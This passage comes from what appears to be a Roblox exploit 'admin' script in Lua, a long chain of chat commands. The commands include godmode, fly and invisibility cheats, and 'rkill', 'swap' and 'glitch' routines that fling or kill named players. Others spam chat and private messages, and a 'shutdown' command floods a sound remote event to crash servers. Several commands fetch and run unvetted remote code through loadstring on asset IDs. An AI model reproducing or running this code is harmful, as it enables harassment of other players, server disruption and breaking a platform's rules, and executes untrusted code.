        lplayer.Character["Right Leg"]:Destroy()
        lplayer.Character["Right Arm"]:Destroy()
    end
    if string.sub(msg, 1, 4) == (prefix.."god") then
        lplayer.Character.Humanoid.Name = 1
        local l = lplayer.Character["1"]:Clone()
        l.Parent = lplayer.Character
        l.Name = "Humanoid"
        wait(0.1)
        lplayer.Character["1"]:Destroy()
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
        lplayer.Character.Animate.Disabled = true
        wait(0.1)
        lplayer.Character.Animate.Disabled = false
        lplayer.Character.Humanoid.DisplayDistanceType = "None"
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE Godmode enabled";
        Text = "Use ;grespawn or ;respawn to remove";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."drophats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Parent = workspace
            end
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."droptool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Parent = workspace
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."loopdhats") then
        droppinghats = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Enabled";
        Text = "Type ;unloopdhats to disable";
        })
    end
    if string.sub(msg, 1, 12) == (prefix.."unloopdhats") then
        droppinghats = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Disabled";
        Text = "Type ;loopdhats to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."loopdtool") then
        droppingtools = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Enabled";
        Text = "Type ;unloopdtool to disable";
        })
    end
    if string.sub(msg, 1, 12) == (prefix.."unloopdtool") then
        droppingtools = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Disabled";
        Text = "Type ;loopdtool to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."invisible") then -- Credit to Timeless
        Local = game:GetService('Players').LocalPlayer
        Char  = Local.Character
        touched,tpdback = false, false
        box = Instance.new('Part',workspace)
        box.Anchored = true
        box.CanCollide = true
        box.Size = Vector3.new(10,1,10)
        box.Position = Vector3.new(0,10000,0)
        box.Touched:connect(function(part)
            if (part.Parent.Name == Local.Name) then
                if touched == false then
                    touched = true
                    function apply()
                        if script.Disabled ~= true then
                            no = Char.HumanoidRootPart:Clone()
                            wait(.25)
                            Char.HumanoidRootPart:Destroy()
                            no.Parent = Char
                            Char:MoveTo(loc)
                            touched = false
                        end end
                    if Char then
                        apply()
                    end
                end
            end
        end)
        repeat wait() until Char
        loc = Char.HumanoidRootPart.Position
        Char:MoveTo(box.Position + Vector3.new(0,.5,0))
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Invisibility enabled!";
        Text = "Reset or use ;respawn to remove.";
        })
    end
    if string.sub(msg, 1, 6) == (prefix.."view ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            if game:GetService("Players")[v.Name].Character.Humanoid then
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
            else
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unview") then
        if lplayer.Character.Humanoid then
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
        else
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."goto ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
        end
    end
    if string.sub(msg, 1, 4) == (prefix.."fly") then
    repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
    repeat wait() until Mouse
   
    local T = lplayer.Character.HumanoidRootPart
    local CONTROL = {F = 0, B = 0, L = 0, R = 0}
    local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
    local SPEED = speedget
   
    local function fly()
        flying = true
        local BG = Instance.new('BodyGyro', T)
        local BV = Instance.new('BodyVelocity', T)
        BG.P = 9e4
        BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        BG.cframe = T.CFrame
        BV.velocity = Vector3.new(0, 0.1, 0)
        BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
        spawn(function()
        repeat wait()
        lplayer.Character.Humanoid.PlatformStand = true
        if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
        SPEED = 50
        elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
        SPEED = 0
        end
        if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
        elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        else
        BV.velocity = Vector3.new(0, 0.1, 0)
        end
        BG.cframe = workspace.CurrentCamera.CoordinateFrame
                until not flying
                CONTROL = {F = 0, B = 0, L = 0, R = 0}
                lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                SPEED = 0
                BG:destroy()
                BV:destroy()
                lplayer.Character.Humanoid.PlatformStand = false
            end)
        end
    Mouse.KeyDown:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = speedfly
        elseif KEY:lower() == 's' then
            CONTROL.B = -speedfly
        elseif KEY:lower() == 'a' then
            CONTROL.L = -speedfly
        elseif KEY:lower() == 'd' then
            CONTROL.R = speedfly
        end
    end)
    Mouse.KeyUp:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = 0
        elseif KEY:lower() == 's' then
            CONTROL.B = 0
        elseif KEY:lower() == 'a' then
            CONTROL.L = 0
        elseif KEY:lower() == 'd' then
            CONTROL.R = 0
        end
    end)
    fly()
    end
    if string.sub(msg, 1, 6) == (prefix.."unfly") then
        flying = false
        lplayer.Character.Humanoid.PlatformStand = false
    end
    if string.sub(msg, 1, 6) == (prefix.."chat ") then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(msg, 7)), "All")
    end
    if string.sub(msg, 1, 6) == (prefix.."spam ") then
        spamtext = (string.sub(msg, 7))
        spamming = true
    end
    if string.sub(msg, 1, 7) == (prefix.."unspam") then
        spamming = false
    end
    if string.sub(msg, 1, 10) == (prefix.."spamwait ") then
        spamdelay = (string.sub(msg, 11))
    end
    if string.sub(msg, 1, 8) == (prefix.."pmspam ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            pmspammed = v.Name
            spammingpm = true
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unpmspam") then
        spammingpm = false
    end
    if string.sub(msg, 1, 9) == (prefix.."cfreeze ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 10))) do
            v.Character["Left Leg"].Anchored = true
            v.Character["Left Arm"].Anchored = true
            v.Character["Right Leg"].Anchored = true
            v.Character["Right Arm"].Anchored = true
            v.Character.Torso.Anchored = true
            v.Character.Head.Anchored = true
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."uncfreeze ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 12))) do
            v.Character["Left Leg"].Anchored = false
            v.Character["Left Arm"].Anchored = false
            v.Character["Right Leg"].Anchored = false
            v.Character["Right Arm"].Anchored = false
            v.Character.Torso.Anchored = false
            v.Character.Head.Anchored = false
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unlockws") then
        local a = game:GetService("Workspace"):getChildren()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Locked = false
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Locked = false
                    end
                end
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "Workspace unlocked. Use ;lockws to lock.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."lockws") then
        local a = game:GetService("Workspace"):getChildren()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Locked = true
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Locked = true
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."btools") then
        local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
        Clone_T.BinType = "Clone"
        local Destruct = Instance.new("HopperBin",lplayer.Backpack)
        Destruct.BinType = "Hammer"
        local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
        Hold_T.BinType = "Grab"
    end
    if string.sub(msg, 1, 7) == (prefix.."pstand") then
        lplayer.Character.Humanoid.PlatformStand = true
    end
    if string.sub(msg, 1, 9) == (prefix.."unpstand") then
        lplayer.Character.Humanoid.PlatformStand = false
    end
    if string.sub(msg, 1, 10) == (prefix.."blockhead") then
        lplayer.Character.Head.Mesh:Destroy()
    end
    if string.sub(msg, 1, 4) == (prefix.."sit") then
        lplayer.Character.Humanoid.Sit = true
    end
    if string.sub(msg, 1, 10) == (prefix.."bringobj ") then
        local function bringobjw()
        for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
        if obj.Name == (string.sub(msg, 11)) then
        obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        obj.CanCollide = false
        obj.Transparency = 0.7
        wait()
        obj.CFrame = lplayer.Character["Left Leg"].CFrame
        wait()
        obj.CFrame = lplayer.Character["Right Leg"].CFrame
        wait()
        obj.CFrame = lplayer.Character["Head"].CFrame
        end
        end
        end
        while wait() do
            bringobjw()
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "BringObj";
        Text = "BringObj enabled.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."wsvis ") then
        vis = (string.sub(msg, 8))
        local a = game:GetService("Workspace"):GetDescendants()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Transparency = vis
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Transparency = vis
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."hypertotal") then
        loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "HyperTotal GUI Loaded!";
        })
    end
    if string.sub(msg, 1, 5) == (prefix.."cmds") then
        CMDSFRAME.Visible = true
    end
    if string.sub(msg, 1, 10) == (prefix.."rmeshhats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."blockhats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."rmeshtool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."blocktool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."spinner") then
        local p = Instance.new("RocketPropulsion")
        p.Parent = lplayer.Character.HumanoidRootPart
        p.Name = "Spinner"
        p.Target = lplayer.Character["Left Arm"]
        p:Fire()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Spinner enabled";
        Text = "Type ;nospinner to disable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."nospinner") then
        lplayer.Character.HumanoidRootPart.Spinner:Destroy()
    end
    if string.sub(msg, 1, 7) == (prefix.."reachd") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                local a = Instance.new("SelectionBox",v.Handle)
                a.Adornee = v.Handle
                v.Handle.Size = Vector3.new(0.5,0.5,60)
                v.GripPos = Vector3.new(0,0,0)
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach applied!";
        Text = "Applied to equipped sword. Use ;noreach to disable.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."reach ") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                handleSize = v.Handle.Size
                wait()
                local a = Instance.new("SelectionBox",v.Handle)
                a.Name = "a"
                a.Adornee = v.Handle
                v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(msg, 8)))
                v.GripPos = Vector3.new(0,0,0)
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach applied!";
        Text = "Applied to equipped sword. Use ;noreach to disable.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."noreach") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                v.Handle.a:Destroy()
                v.Handle.Size = handleSize
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach removed!";
        Text = "Removed reach from equipped sword.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."rkill ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            wait(0.1)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."tp me ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."cbring ") then
        if (string.sub(msg, 9)) == "all" or (string.sub(msg, 9)) == "All" or (string.sub(msg, 9)) == "ALL" then
            cbringall = true
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
                brplr = v.Name
            end
        end
        cbring = true
    end
    if string.sub(msg, 1, 9) == (prefix.."uncbring") then
        cbring = false
        cbringall = false
    end
    if string.sub(msg, 1, 6) == (prefix.."swap ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            local function tp(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            wait(0.1)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.6)
            tp(lplayer, game:GetService("Players")[v.Name])
            wait(0.4)
            lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."glitch ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.4)
            b = Instance.new("BodyForce")
            b.Parent = lplayer.Character.HumanoidRootPart
            b.Name = "Glitch"
            b.Force = Vector3.new(100000000,5000,0)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unglitch") then
        lplayer.Character.HumanoidRootPart.Glitch:Destroy()
        lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
        b = Instance.new("BodyForce")
        b.Parent = lplayer.Character.HumanoidRootPart
        b.Name = "unGlitch"
        b.Force = Vector3.new(0,-5000000,0)
        wait(2)
        lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
    end
    if string.sub(msg, 1, 9) == (prefix.."grespawn") then
        lplayer.Character.Humanoid.Health = 0
        wait(1)
        lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
        lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
    end
    if string.sub(msg, 1, 9) == (prefix.."explorer") then
        loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "DEX Explorer has loaded.";
        })
    end
    if string.sub(msg, 1, 6) == (prefix.."anim ") then
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://"..(string.sub(msg, 7))
        local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
        track:Play(.1, 1, 1)
    end
    if string.sub(msg, 1, 8) == (prefix.."animgui") then
        loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "Energize Animations GUI has loaded.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."savepos") then
        saved = lplayer.Character.HumanoidRootPart.CFrame
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Position Saved";
        Text = "Use ;loadpos to return to saved position.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."loadpos") then
        lplayer.Character.HumanoidRootPart.CFrame = saved
    end
    if string.sub(msg, 1, 6) == (prefix.."bang ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            local Anim2 = Instance.new("Animation")
            Anim2.AnimationId = "rbxassetid://148840371"
            local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
            track2:Play(.1, 1, 1)
            bplrr = v.Name
            banpl = true
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unbang") then
        banpl = false
    end
    if string.sub(msg, 1, 10) == (prefix.."bringmod ") then
        local function bringmodw()
        for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
        if obj.Name == (string.sub(msg, 11)) then
        for i,ch in pairs(obj:GetDescendants()) do
        if (ch:IsA("BasePart")) then
        ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        ch.CanCollide = false
        ch.Transparency = 0.7
        wait()
        ch.CFrame = lplayer.Character["Left Leg"].CFrame
        wait()
        ch.CFrame = lplayer.Character["Right Leg"].CFrame
        wait()
        ch.CFrame = lplayer.Character["Head"].CFrame
        end
        end
        end
        end
        end
        while wait() do
            bringmodw()
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "BringMod";
        Text = "BringMod enabled.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."respawn") then
        local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
        local hum = Instance.new('Humanoid', mod)
        local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
        lplayer.Character = mod
    end
    if string.sub(msg, 1, 9) == (prefix.."shutdown") then
        game:GetService'RunService'.Stepped:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService'Players':GetPlayers()) do
                if v.Character ~= nil and v.Character:FindFirstChild'Head' then
                    for _,x in pairs(v.Character.Head:GetChildren()) do
                        if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
                    end
                end
            end
        end)
        end)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Attempting Shutdown";
        Text = "Shutdown Attempt has begun.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."delobj ") then
        objtodel = (string.sub(msg, 9))
        for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v.Name == objtodel then
                v:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."getplrs") then
        for i,v in pairs(game:GetService("Players"):GetPlayers())do
            print(v)
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printed";
        Text = "Players have been printed to console. (F9)";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."deldecal") then
        for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
            if (v:IsA("Decal")) then
                v:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."opfinality") then
        loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "OpFinality GUI has loaded.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."remotes") then
        remotes = true
        added = true
        game.DescendantAdded:connect(function(rmt)
        if added == true then
        if remotes == true then
        if rmt:IsA("RemoteEvent") then
        print("A RemoteEvent was added!")
        print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
        print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
        end end end
        end)
        game.DescendantAdded:connect(function(rmtfnctn)
        if added == true then
        if remotes == true then
        if rmtfnctn:IsA("RemoteFunction") then
        warn("A RemoteFunction was added!")
        warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
        print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
        end end end
        end)
       
        game.DescendantAdded:connect(function(bndfnctn)
        if added == true then
        if binds == true then
        if bndfnctn:IsA("BindableFunction") then
        print("A BindableFunction was added!")
        print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
        print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
        end end end
        end)
       
        game.DescendantAdded:connect(function(bnd)
        if added == true then
        if binds == true then
        if bnd:IsA("BindableEvent") then
        warn("A BindableEvent was added!")
        warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
        print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
        end end end
        end)
       
       
        if binds == true then
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("BindableFunction") then
        print(" game." .. v:GetFullName() .. " | BindableFunction")
        print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
        end end
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("BindableEvent") then
        warn(" game." .. v:GetFullName() .. " | BindableEvent")
        print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
        end end
        else
        print("Off")
        end
        if remotes == true then
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteFunction") then
        warn(" game." .. v:GetFullName() .. " | RemoteFunction")
        print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
        end end
        wait()
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
        print(" game." .. v:GetFullName() .. " | RemoteEvent")
        print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
        end end
        else
        print("Off")
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printing Remotes";
        Text = "Type ;noremotes to disable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."noremotes") then
        remotes = false
        added = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printing Remotes Disabled";
        Text = "Type ;remotes to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."tpdefault") then
        spin = false
        followed = false
        traill = false
        noclip = false
        annoying = false
        hwalk = false
        cbringing = false
    end
    if string.sub(msg, 1, 8) == (prefix.."stopsit") then
        stopsitting = true
    end
    if string.sub(msg, 1, 6) == (prefix.."gosit") then
        stopsitting = false
    end
    if string.sub(msg, 1, 8) == (prefix.."version") then
        print(adminversion)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Version";
        Text = adminversion;
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."clicktp") then
        clickgoto = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click TP";
        Text = "Press E to teleport to mouse position, ;noclicktp to stop";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."clickdel") then
        clickdel = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click Delete";
        Text = "Press E to delete part at mouse, ;noclickdel to stop";
        })
    end
    if string.sub(msg, 1, 11) == (prefix.."noclickdel") then
        clickdel = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click Delete";
        Text = "Click delete has been disabled.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."noclicktp") then
        clickgoto = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click TP";
        Text = "Click TP has been disabled.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."toolson") then
        gettingtools = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Tools Enabled";
        Text = "Automatically colleting tools dropped.";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."toolsoff") then
        gettingtools = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Tools Disabled";
        Text = "Click TP has been disabled.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."delcmdbar") then
        ScreenGui:Destroy()
    end
    if string.sub(msg, 1, 6) == (prefix.."reset") then
        lplayer.Character.Head:Destroy()
    end
    if string.sub(msg, 1, 7) == (prefix.."state ") then
        statechosen = string.sub(msg, 8)
        changingstate = true
    end
    if string.sub(msg, 1, 9) == (prefix.."gravity ") then
        game:GetService("Workspace").Gravity = string.sub(msg, 10)
    end
    if string.sub(msg, 1, 10) == (prefix.."looprhats") then
        removingmeshhats = true
    end
    if string.sub(msg, 1, 12) == (prefix.."unlooprhats") then
        removingmeshhats = false
    end
    if string.sub(msg, 1, 10) == (prefix.."looprtool") then
        removingmeshtool = true
    end
    if string.sub(msg, 1, 12) == (prefix.."unlooprtool") then
        removingmeshtool = false
    end
    if string.sub(msg, 1, 10) == (prefix.."givetool ") then
        for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
            if v:IsA("Tool") then
                for i,player in pairs(GetPlayer(string.sub(msg, 11))) do
                    v.Parent = player.Character
                end
            end
        end
    end
    if string.sub(msg, 1, 14) == (prefix.."givealltools ") then
        for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
            if v:IsA("Tool") then
                v.Parent = lplayer.Character
                wait()
                for i,player in pairs(GetPlayer(string.sub(msg, 15))) do
                    v.Parent = player.Character
                end
            end
        end
    end
    if string.sub(msg, 1, 5) == (prefix.."age ") then
